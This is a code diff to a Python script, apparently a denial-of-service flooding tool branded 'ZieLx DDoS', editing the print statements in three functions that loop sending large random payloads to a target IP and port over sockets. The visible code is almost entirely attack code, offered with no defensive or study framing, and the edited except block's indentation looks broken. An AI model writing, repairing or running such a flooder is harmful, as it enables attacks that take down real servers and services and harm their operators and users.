@@ -58,9 +58,9 @@ def ddos():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +"\033]96m ZieLx DDoS Attack In Ip \033[91m{ip} \033[96mPort {port} \033[96m!!!".format(ip, port))
+			print(i +"\033]96m ZieLx DDoS Attack In Ip \033[91m{ip} \033[96mPort {port} \033[96m!!! ") 
 		except:
-			print("\033]96m ZieLx DDoS Attack In Ip \033[91m{ip} \033[96mPort {port} \033[96m!!!".format(ip, port))
+			print("\033]96m ZieLx DDoS Attack In Ip \033[91m{ip} \033[96mPort {port} \033[96m!!! ") 
 
 def ddos2():
 	data = random._urandom(696969)
@@ -72,10 +72,10 @@ def ddos2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"\033]96m ZieLx DDoS Attack In Ip \033[91m{ip} \033[96mPort {port} \033[96m!!!".format(ip, port))
+			print(i +"\033]96m ZieLx DDoS Attack In Ip \033[91m{ip} \033[96mPort {port} \033[96m!!! ") 
 		except:
 			s.close()
-			print("\033]96m ZieLx DDoS Attack In Ip \033[91m{ip} \033[96mPort {port} \033[96m!!!".format(ip, port))
+			print("\033]96m ZieLx DDoS Attack In Ip \033[91m{ip} \033[96mPort {port} \033[96m!!! ") 
 
 def ddos3():
 	data = random._urandom(20000)
@@ -87,9 +87,10 @@ def ddos3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"\033]96m ZieLx DDoS Attack In Ip \033[91m{ip} \033[96mPort {port} \033[96m!!!".format(ip, port))		except:
+			print(i +"\033]96m ZieLx DDoS Attack In Ip \033[91m{ip} \033[96mPort {port} \033[96m!!! ") 
+	except:
 			s.close()
-			print("\033]96m ZieLx DDoS Attack In Ip \033[91m{ip} \033[96mPort {port} \033[96m!!!".format(ip, port))
+			print("\033]96m ZieLx DDoS Attack In Ip \033[91m{ip} \033[96mPort {port} \033[96m!!! ") 
 
 for y in range(threads):
 	if choice == 'ddos':
